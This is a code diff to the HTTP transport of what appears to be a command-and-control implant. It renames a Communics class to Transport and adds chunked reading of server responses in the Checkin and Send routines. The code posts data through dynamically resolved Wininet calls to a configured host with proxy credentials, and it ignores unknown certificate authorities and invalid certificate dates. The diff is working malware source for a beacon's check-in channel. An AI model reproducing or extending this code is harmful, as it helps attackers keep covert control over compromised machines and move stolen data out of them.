@@ -2,7 +2,7 @@
 
 using namespace Root;
 
-auto DECLFN Communics::Checkin(
+auto DECLFN Transport::Checkin(
     VOID
 ) -> BOOL {
     PPACKAGE CheckinPkg = Kh->Pkg->Checkin();
@@ -60,7 +60,7 @@ auto DECLFN Communics::Checkin(
     return TRUE;
 }
 
-auto DECLFN Communics::Send(
+auto DECLFN Transport::Send(
     _In_      PVOID   Data,
     _In_      UINT64  Size,
     _Out_opt_ PVOID  *RecvData,
@@ -77,6 +77,7 @@ auto DECLFN Communics::Send(
 
     BOOL   Success = 0;
 
+    PVOID  TmpBuffer     = NULL;
     PVOID  RespBuffer    = NULL;
     SIZE_T RespSize      = 0;
     DWORD  BytesRead     = 0;
@@ -89,19 +90,19 @@ auto DECLFN Communics::Send(
     HttpFlags = INTERNET_FLAG_RELOAD;
 
     hSession = Kh->Wininet.InternetOpenW(   
-        Kh->Transport.Web.UserAgent, HttpAccessType,
+        Kh->Tsp->Web.UserAgent, HttpAccessType,
         HttpProxy, 0, 0
     );
     if ( !hSession ) { KhDbg( "last error: %d", KhGetError() ); goto _KH_END; }
 
     hConnect = Kh->Wininet.InternetConnectW(
-        hSession, Kh->Transport.Web.Host, Kh->Transport.Web.Port,
-        Kh->Transport.Web.ProxyUsername, Kh->Transport.Web.ProxyPassword,
+        hSession, Kh->Tsp->Web.Host, Kh->Tsp->Web.Port,
+        Kh->Tsp->Web.ProxyUsername, Kh->Tsp->Web.ProxyPassword,
         INTERNET_SERVICE_HTTP, 0, 0
     );
     if ( !hConnect ) { KhDbg( "last error: %d", KhGetError() ); goto _KH_END; }
 
-    if ( Kh->Transport.Web.Secure ) {
+    if ( Kh->Tsp->Web.Secure ) {
         HttpFlags |= INTERNET_FLAG_SECURE;
         OptFlags   = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
             SECURITY_FLAG_IGNORE_CERT_DATE_INVALID   |
@@ -111,7 +112,7 @@ auto DECLFN Communics::Send(
     }        
 
     hRequest = Kh->Wininet.HttpOpenRequestW( 
-        hConnect, L"POST", Kh->Transport.Web.EndPoint, NULL, 
+        hConnect, L"POST", Kh->Tsp->Web.EndPoint, NULL, 
         NULL, NULL, HttpFlags, 0 
     );
     if ( !hRequest ) { KhDbg( "last error: %d", KhGetError() ); goto _KH_END; }
@@ -119,8 +120,8 @@ auto DECLFN Communics::Send(
     Kh->Wininet.InternetSetOptionW( hRequest, INTERNET_OPTION_SECURITY_FLAGS, &OptFlags, sizeof( OptFlags ) );
 
     Success = Kh->Wininet.HttpSendRequestW(
-        hRequest, Kh->Transport.Web.HttpHeaders,
-        Str::LengthW( Kh->Transport.Web.HttpHeaders ),
+        hRequest, Kh->Tsp->Web.HttpHeaders,
+        Str::LengthW( Kh->Tsp->Web.HttpHeaders ),
         Data, Size
     );
     if ( !Success ) { KhDbg( "last error: %d", KhGetError() ); goto _KH_END; }
@@ -137,19 +138,47 @@ auto DECLFN Communics::Send(
             hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
             &ContentLength, &ContentLenLen, NULL
         );
-        if ( !Success ) { KhDbg( "last error: %d", KhGetError() ); goto _KH_END; }
+        if ( !Success ) { 
+            if ( KhGetError() == 12150 ) {
+                KhDbg( "content-length header not found" );
+            } else {
+                KhDbg( "last error: %d", KhGetError() );
+            }
+        }
 
         RespSize = ContentLength;
-
-        if ( ContentLength ) {
-            RespBuffer = C_PTR( Kh->Hp->Alloc( ContentLength + 1 ) );
+        
+        if ( RespSize ) {
+            RespBuffer = C_PTR( Kh->Hp->Alloc( RespSize + 1 ) );
             Kh->Wininet.InternetReadFile( hRequest, RespBuffer, RespSize, &BytesRead );
+        } else {
+            RespSize   = 0;
+            RespBuffer = NULL;
+            TmpBuffer  = C_PTR( Kh->Hp->Alloc( BEG_BUFFER_LENGTH ) );
+
+            do {
+                Kh->Wininet.InternetReadFile( hRequest, TmpBuffer, BEG_BUFFER_LENGTH, &BytesRead );
+
+                RespSize += BytesRead;
+
+                if ( !RespBuffer ) {
+                    RespBuffer = C_PTR( Kh->Hp->Alloc( RespSize ) );
+                } else {
+                    RespBuffer = C_PTR( Kh->Hp->ReAlloc( RespBuffer, RespSize ) );
+                }
+
+                Mem::Copy( C_PTR( U_PTR( RespBuffer ) + ( RespSize - BytesRead ) ), TmpBuffer, BytesRead );
+                Mem::Zero( U_PTR( TmpBuffer ), BytesRead );
+                
+            } while ( BytesRead > 0 );
+            
+            Kh->Hp->Free( TmpBuffer, BEG_BUFFER_LENGTH );
         }
         
-        KhDbg( "request: at %p %s [%d bytes] %d reads\n", RespBuffer, RespBuffer, RespSize, BytesRead );
+        KhDbg( "request: at %p [%d bytes]\n", RespBuffer, RespSize );
 
         if ( RespBuffer ) *RecvData = RespBuffer;
-        if ( RecvSize   ) *RecvSize = BytesRead;
+        if ( RecvSize   ) *RecvSize = RespSize;
 
         Success = TRUE;            
     } else {
